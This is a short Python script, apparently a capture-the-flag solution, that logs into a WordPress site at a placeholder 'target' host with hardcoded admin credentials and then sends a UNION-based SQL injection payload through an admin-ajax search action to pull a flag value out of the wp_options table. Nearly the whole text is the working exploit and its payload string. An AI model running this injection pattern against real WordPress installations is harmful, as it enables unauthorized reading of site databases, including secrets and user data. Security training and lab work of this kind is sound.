BASE = "http://target"
import requests
import json

s = requests.Session()

# Log in as admin (allow_redirects=False: WP redirects to http://localhost after auth)
s.post(
    BASE + "/wp-login.php",
    data={"log": "admin", "pwd": "ictfadmin123", "testcookie": "1"},
    cookies={"wordpress_test_cookie": "WP Cookie check"},
    allow_redirects=False,
)

# Exploit: UNION-based SQLi to extract the flag from wp_options
r = s.post(
    BASE + "/wp-admin/admin-ajax.php",
    data={
        "action": "cf7_search_entries",
        "query": "x' UNION SELECT 1,option_name,1,option_value,1 FROM wp_options WHERE option_name='ictf_flag'-- -",
    },
)

data = json.loads(r.text)
flag = data["data"][0]["message"]
print(flag)
